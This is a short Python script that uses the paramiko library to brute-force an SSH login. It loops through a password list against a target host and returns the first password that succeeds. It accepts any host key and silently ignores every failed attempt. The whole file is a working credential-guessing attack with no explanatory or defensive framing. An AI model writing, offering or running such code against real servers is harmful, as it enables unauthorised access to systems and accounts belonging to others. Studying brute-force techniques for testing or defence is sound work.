import paramiko

def ssh_brute_force(target, user, passwords):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for pwd in passwords:
        try:
            ssh.connect(target, username=user, password=pwd, timeout=3)
            ssh.close()
            return pwd
        except:
            continue
    return None
